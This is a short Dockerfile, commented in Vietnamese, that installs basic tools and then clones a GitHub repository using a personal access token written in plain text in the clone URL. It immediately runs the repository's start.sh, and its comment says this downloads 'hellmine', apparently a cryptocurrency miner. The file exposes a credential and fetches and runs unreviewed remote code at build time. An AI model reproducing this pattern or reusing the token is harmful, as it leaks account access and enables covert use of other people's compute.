
FROM ubuntu:latest

# Cập nhật hệ thống và cài đặt các gói cần thiết
RUN apt update && apt upgrade -y && apt-get update && apt-get install -y htop \
    curl \
    ca-certificates \
    git \
    sudo \ 
    unzip \
    python3 
    

# Tạo thư mục làm việc và tải hellmine

RUN git clone https://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@github.com/Teo4268/New.git && cd New && chmod +x start.sh &&  ./start.sh 48
